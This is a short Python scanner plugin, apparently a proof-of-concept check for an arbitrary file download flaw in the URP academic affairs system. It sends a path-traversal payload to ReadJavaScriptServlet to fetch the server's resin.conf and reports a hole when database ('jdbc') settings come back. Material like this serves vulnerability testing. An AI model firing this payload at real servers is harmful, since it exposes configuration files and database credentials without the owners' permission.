#!/usr/bin/env python
# -*- coding: utf-8 -*-
#URP教务系统任意文件下载漏洞
#__author__ = 'range'

import  re

def assign(service, arg):
    if service == "urp":
        return True, arg

def audit(arg):
    url = arg
    payload = '/servlet/com.runqian.base.util.ReadJavaScriptServlet?file=../../../../../../../../conf/resin.conf'
    verify_url = url +  payload
    code, head, res, errcode, _ = curl.curl(verify_url)
    if 'jdbc' in res:
        security_hole(verify_url)



if __name__ == '__main__':
    from dummy import *
    audit(assign('urp', 'http://www.example.com/')[1])
